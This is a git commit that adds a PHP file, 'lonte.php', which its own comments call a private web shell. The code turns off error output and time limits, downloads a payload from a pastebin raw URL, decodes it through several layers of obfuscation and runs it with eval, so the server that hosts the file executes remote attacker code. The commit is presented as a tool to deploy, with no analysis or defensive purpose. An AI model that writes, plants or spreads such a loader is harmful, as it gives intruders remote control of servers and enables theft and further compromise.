460c171dd890914b8ab076f432393ed53cf40b98
hunterhost <34702136+hunterhost@users.noreply.github.com>
2018-05-16 16:43:17 +0700

    Create lonte.php

---
+++ lonte.php
@@ -0,0 +1,9 @@
+<?php
+//hunterhost Priv8 shell
+//recode shell Kaizen Priv8
+set_time_limit(0);
+error_reporting(0);
+$lol="8c1509cd4a1bdba5b8325f10397fce13"; // Cybercrime
+$Hunterhost = file_get_contents('https://pastebin.com/raw/yXmyEq9a');
+eval(str_rot13(gzinflate(str_rot13(base64_decode(($Hunterhost)))))); 
+?>
